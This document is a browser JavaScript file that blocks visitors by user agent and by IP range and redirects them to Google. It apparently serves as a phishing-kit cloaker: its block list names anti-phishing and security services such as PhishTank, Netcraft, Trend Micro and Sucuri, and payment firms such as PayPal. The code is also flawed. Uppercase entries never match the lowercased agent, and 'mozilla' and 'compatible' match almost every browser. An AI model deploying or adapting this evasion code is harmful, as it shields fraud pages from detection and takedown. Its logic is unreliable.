(async function () {
  const IP_STORAGE_KEY = "userIP";
  const COUNTRY_STORAGE_KEY = "country";
  const userAgent = navigator.userAgent.toLowerCase();

  /** 🛑 1️⃣ Block bots based on User-Agent **/
const blockedAgents = [
  "Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "drweb", "hostinger", 
  "scanurl", "above", "google", "Dr.Web", "facebook", "softlayer", "amazonaws", 
  "cyveillance", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "phishtank",
  "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", 
  "messagelabs", "sucuri.net", "crawler", "bot", "apache-httpclient", "lssrocketcrawler", 
  "urlredirectresolver", "jetbrains", "spam", "windows 95", "windows 98", "acunetix", 
  "netsparker", "007ac9", "008", "192.comagent", "200pleasebot", "360spider", "4seohuntbot", 
  "50.nu", "a6-indexer", "admantx", "amznkassocbot", "aboundexbot", "aboutusbot", 
  "abrave spider", "accelobot", "acoonbot", "addthis.com", "adsbot-google", "ahrefsbot", 
  "alexabot", "amagit.com", "analytics", "antbot", "apercite", "aportworm", "EBAY", 
  "CL0NA", "jabber", "arabot", "hotmail!", "msn!", "outlook!", "outlook", "msn", 
  "hotmail", "compatible", "mozilla", "Trident", "X11", "Windows XP", "windows xp", 
  "Googlebot", "Baiduspider", "R6_FeedFetcher", "NetcraftSurveyAgent", "Sogou web spider", 
  "bingbot", "Yahoo! Slurp", "facebookexternalhit", "PrintfulBot", "Twitterbot", 
  "UnwindFetchor", "urlresolver", "Butterfly", "TweetmemeBot", "PaperLiBot", "MJ12bot", 
  "AhrefsBot", "Exabot", "Ezooms", "YandexBot", "SearchmetricsBot", "picsearch", 
  "TweetedTimes Bot", "QuerySeekerSpider", "ShowyouBot", "woriobot", "merlinkbot", 
  "BazQuxBot", "Kraken", "SISTRIX Crawler", "R6_CommentReader", "magpie-crawler", 
  "GrapeshotCrawler", "PercolateCrawler", "MaxPointCrawler", "NetSeer crawler", 
  "grokkit-crawler", "SMXCrawler", "PulseCrawler", "Y!J-BRW", "80legs.com/webcrawler", 
  "Mediapartners-Google", "Spinn3r", "InAGist", "Python-urllib", "NING", 
  "TencentTraveler", "Feedfetcher-Google", "mon.itor.us", "spbot", "Feedly", "curl"
];

  if (blockedAgents.some(agent => userAgent.includes(agent))) {
    window.location.href = "https://www.google.com/";
  }

  /** 🛑 2️⃣ Fetch User IP and Country if not cached **/
  let userIP = localStorage.getItem(IP_STORAGE_KEY);
  let userCountry = localStorage.getItem(COUNTRY_STORAGE_KEY);

  if (!userIP || !userCountry) {
    try {
      const response = await fetch("https://ipinfo.io/json");
      const data = await response.json();
      
      userIP = data.ip;
      userCountry = data.country;

      localStorage.setItem(IP_STORAGE_KEY, userIP);
      localStorage.setItem(COUNTRY_STORAGE_KEY, userCountry);

      console.log(`✅ IP stored: ${userIP}, Country stored: ${userCountry}`);
    } catch (error) {
      userIP = "Unknown IP";
      userCountry = "Unknown Country"; // Fallback if API fails
    }
  } else {
  }
  window.userIP = userIP;

  /** 🛑 3️⃣ Block bots based on IP pattern matching **/
const blockedIPs = [
  /^66\.102\..*/, /^38\.100\..*/, /^107\.170\..*/, /^149\.20\..*/, /^38\.105\..*/, 
  /^173\.239\..*/, /^173\.244\.36\..*/, /^74\.125\..*/, /^66\.150\.14\..*/, /^54\.176\..*/, 
  /^184\.173\..*/, /^66\.249\..*/, /^128\.242\..*/, /^72\.14\.192\..*/, /^208\.65\.144\..*/, 
  /^209\.85\.128\..*/, /^216\.239\.32\..*/, /^207\.126\.144\..*/, /^173\.194\..*/, 
  /^64\.233\.160\..*/, /^64\.18\..*/, /^194\.52\.68\..*/, /^194\.72\.238\..*/, 
  /^62\.116\.207\..*/, /^212\.50\.193\..*/, /^69\.65\..*/, /^50\.7\..*/, /^131\.212\..*/, 
  /^46\.116\..*/, /^62\.90\..*/, /^89\.138\..*/, /^82\.166\..*/, /^85\.64\..*/, 
  /^85\.250\..*/, /^93\.172\..*/, /^109\.186\..*/, /^194\.90\..*/, /^212\.29\.192\..*/, 
  /^212\.29\.224\..*/, /^212\.143\..*/, /^212\.150\..*/, /^212\.235\..*/, /^217\.132\..*/, 
  /^50\.97\..*/, /^209\.85\..*/, /^66\.205\.64\..*/, /^204\.14\.48\..*/, /^64\.27\.2\..*/, 
  /^67\.15\..*/, /^202\.108\.252\..*/, /^193\.47\.80\..*/, /^64\.62\.136\..*/, 
  /^66\.221\..*/, /^64\.62\.175\..*/, /^198\.54\..*/, /^192\.115\.134\..*/, /^216\.252\.167\..*/, 
  /^193\.253\.199\..*/, /^69\.61\.12\..*/, /^64\.37\.103\..*/, /^38\.144\.36\..*/, 
  /^64\.124\.14\..*/, /^206\.28\.72\..*/, /^209\.73\.228\..*/, /^158\.108\..*/, /^168\.188\..*/
];

  if (userIP && blockedIPs.some(pattern => pattern.test(userIP))) {
    window.location.href = "https://www.google.com/";
  }

})();
